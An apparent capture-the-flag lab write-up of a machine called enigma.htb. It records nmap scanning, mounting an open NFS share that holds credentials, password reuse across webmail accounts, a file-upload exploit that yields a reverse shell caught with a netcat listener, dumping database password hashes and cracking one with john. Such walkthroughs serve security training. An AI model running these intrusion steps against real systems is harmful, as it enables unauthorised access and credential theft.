ME: 10.10.14.139 
TARGET: 10.129.27.158

# NMAP

```
]
└─$ sudo nmap -sC -sV -p- -Pn 10.129.27.158 --max-retries 1 
[sudo] password for xmen: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-02 04:52 -0400
Warning: 10.129.27.158 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.129.27.158
Host is up (0.029s latency).
Not shown: 65328 closed tcp ports (reset), 194 filtered tcp ports (no-response)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://enigma.htb/
110/tcp   open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_pop3-capabilities: UIDL SASL TOP CAPA RESP-CODES STLS AUTH-RESP-CODE PIPELINING
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      42983/tcp   mountd
|   100005  1,2,3      46248/udp6  mountd
|   100005  1,2,3      47732/udp   mountd
|   100005  1,2,3      53231/tcp6  mountd
|   100021  1,3,4      35089/tcp6  nlockmgr
|   100021  1,3,4      40845/tcp   nlockmgr
|   100021  1,3,4      44179/udp6  nlockmgr
|   100021  1,3,4      58986/udp   nlockmgr
|   100024  1          38603/tcp6  status
|   100024  1          51455/udp6  status
|   100024  1          54357/tcp   status
|   100024  1          60159/udp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
143/tcp   open  imap     Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: more LITERAL+ have ID IDLE ENABLE STARTTLS LOGINDISABLEDA0001 SASL-IR post-login Pre-login capabilities listed OK LOGIN-REFERRALS IMAP4rev1
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: LITERAL+ have ID IDLE LOGIN-REFERRALS more AUTH=PLAINA0001 SASL-IR post-login Pre-login capabilities listed OK ENABLE IMAP4rev1
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: UIDL SASL(PLAIN) TOP CAPA RESP-CODES AUTH-RESP-CODE USER PIPELINING
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
2049/tcp  open  nfs_acl  3 (RPC #100227)
33133/tcp open  mountd   1-3 (RPC #100005)
38927/tcp open  mountd   1-3 (RPC #100005)
40845/tcp open  nlockmgr 1-4 (RPC #100021)
42983/tcp open  mountd   1-3 (RPC #100005)
54357/tcp open  status   1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.45 seconds
```

# Port 80

set enigma.htb in hosts file
Not much here

# Port 111

Using rpcinfo shows a bunch of rpc ports available

# Port 2049

showmount showed an onboarding folder available as an nfs mount

```
└─$ showmount -e 10.129.27.158                             
Export list for 10.129.27.158:
/srv/nfs/onboarding *
```

Mounting it shows an onboarding pdf with some creds in it

```
┌──(xmen㉿kali)-[~]
└─$ sudo mkdir /mnt/onboarding
┌──(xmen㉿kali)-[~]
└─$ sudo mount -t nfs 10.129.27.158:/srv/nfs/onboarding /mnt/onboarding -o nolock 
┌──(xmen㉿kali)-[~]
└─$ cd /mnt/onboarding 
┌──(xmen㉿kali)-[/mnt/onboarding]
└─$ ls          
New_Employee_Access.pdf
```

This gives:

```
Webmail Access
URL:http://mail001.enigma.htb
Username:kevin
Password:Enigma2024!
```

Seems to be email access, can use nc to connect to pop3 Dovecot on port 110 but plaintext auth was disabled for non-TLS

Added mail001 to hosts file and navigated in browser, able to log in kevin

This gave an email in their inbox from sarah. Used the same Enigma2024! default password on her account and got in too.

Account for sarah had an email with more credentials:

```
Hi Sarah,  
  
Apologies for the delay. I have provisioned your access. Please find the details below:  
  
URL: [http://support_001.enigma.htb](http://support_001.enigma.htb)  
Username: admin  
Password: Ne3s4rtars78s  
  
Note: I will create a dedicated account for you shortly, for now you can use the admin account to get started.  
  
Regards,  
IT Support  
Enigma Corp
```

Added support_001 to hosts and logged in with this admin credential.

This service is OpenSTAManager:

```
**Web site:** [www.openstamanager.com](https://www.openstamanager.com "Open source management software for technical assistance and invoicing")

**Version:** 2.9.8 (R5ff39df9b)

**License:** [GPLv3](https://www.gnu.org/licenses/gpl-3.0.txt "Go to the site for read the license")
```

Found various vulns in this version - a blind time-based SQLi that I couldn't get sqlmap to play nice with, a reflected XSS that I didn't go deeper into and finally a file upload vulnerability [CVE-2026-38751](https://www.sentinelone.com/vulnerability-database/cve-2026-38751/)

The file upload vulnerability allows for a reverse shell (Ivan Sincek shell from revshells) in a zip file to get uploaded (PoC shown in description on https://github.com/b0ySie7e/OpenSTAManager-RCE-Exploit-CVE-2026-38751)

This gave a reverse shell on the box.

```
└─$ nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.10.14.139] from (UNKNOWN) [10.129.27.158] 56084
bash: cannot set terminal process group (1533): Inappropriate ioctl for device
bash: no job control in this shell
www-data@enigma:~/html/openstamanager/modules/shell$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@enigma:~/html/openstamanager/modules/shell$ whoami
whoami
www-data
```

# Shell as www-data

Found more creds in the /var/www/html/openstamanager/config.inc.php  for the database accessible on localhost 3306

```
// Impostazioni di base per l'accesso al database
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
// $port = '|port|';
```

Logged in with mysql cli locally and dumped hash for haris user:

```
mysql> select * from zz_users;
select * from zz_users;
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+
| id | username | password                                                     | email            | idanagrafica | idgruppo | enabled | created_at          | updated_at          | reset_token | image_file_id | options |
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+
|  1 | admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu | admin@enigma.htb |            1 |        1 |       1 | 2026-02-18 19:26:52 | 2026-02-18 19:26:52 | NULL        |          NULL |         |
|  2 | haris    | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC | haris@enigma.htb |            1 |        5 |       1 | 2026-02-18 20:58:28 | 2026-05-26 11:07:03 | NULL        |          NULL |         |
+----+----------+------------------------------------------
```

cracked this bcrypt hash in john:

```
┌──(xmen㉿kali)-[~]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bestfriends      (?)     
1g 0:00:00:05 DONE (2026-07-02 06:35) 0.1766g/s 127.2p/s 127.2c/s 127.2C/s gloria..marissa
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

